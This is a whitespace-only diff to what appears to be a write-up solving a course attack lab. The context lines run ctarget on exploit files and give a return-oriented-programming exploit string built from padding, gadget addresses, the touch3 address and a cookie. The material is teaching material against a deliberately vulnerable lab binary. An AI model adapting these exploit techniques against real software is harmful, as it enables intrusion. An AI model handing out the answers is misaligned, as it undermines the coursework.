@@ -331,7 +331,7 @@ e8 fc 66 55 00 00 00 00          /* address of register %rsp */
 
 ./ctarget < atk2r.txt             # use I/O redirection
 
-gdb ctarget                 # within GDB
+gdb ctarget                       # within GDB
 (gdb) run < atk2r.txt
 ```
 
@@ -428,7 +428,7 @@ Generate the raw exploit string and check the answer
 
 ./ctarget < atk3r.txt             # use I/O redirection
 
-gdb ctarget                 # within GDB
+gdb ctarget                       # within GDB
 (gdb) run < atk3r.txt
 ```
 
@@ -794,7 +794,7 @@ Let's check our solution
 
 ./ctarget < atk4r.txt             # use I/O redirection
 
-gdb ctarget                 # within GDB
+gdb ctarget                       # within GDB
 (gdb) run < atk4r.txt
 ```
 
@@ -842,18 +842,18 @@ Now we can create atk5.txt like codes below
 ```
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00               /* padding */
-fb 5b 55 55 55 55 00 00				 /* use gadget 1 address to rewrite the return address*/
-24 5b 55 55 55 55 00 00				 /* gadget 2 address */
-13 5b 55 55 55 55 00 00				 /* gadget 3 address */
-48 00 00 00 00 00 00 00				 /* offset of the cookie string */
-8f 5b 55 55 55 55 00 00				 /* gadget 4 address */
-cb 5b 55 55 55 55 00 00				 /* gadget 5 address */
-f5 5b 55 55 55 55 00 00				 /* gadget 6 address */
-3d 5b 55 55 55 55 00 00				 /* gadget 7 address */
-24 5b 55 55 55 55 00 00				 /* gadget 8 address */
-6e 5a 55 55 55 55 00 00				 /* touch3 address */
-35 66 35 62 64 37 34 65				 /* cookie string */
+00 00 00 00 00 00 00 00                  /* padding */
+fb 5b 55 55 55 55 00 00			 /* use gadget 1 address to rewrite the return address*/
+24 5b 55 55 55 55 00 00			 /* gadget 2 address */
+13 5b 55 55 55 55 00 00			 /* gadget 3 address */
+48 00 00 00 00 00 00 00			 /* offset of the cookie string */
+8f 5b 55 55 55 55 00 00			 /* gadget 4 address */
+cb 5b 55 55 55 55 00 00			 /* gadget 5 address */
+f5 5b 55 55 55 55 00 00			 /* gadget 6 address */
+3d 5b 55 55 55 55 00 00			 /* gadget 7 address */
+24 5b 55 55 55 55 00 00			 /* gadget 8 address */
+6e 5a 55 55 55 55 00 00			 /* touch3 address */
+35 66 35 62 64 37 34 65			 /* cookie string */
 ```
 
 The final result
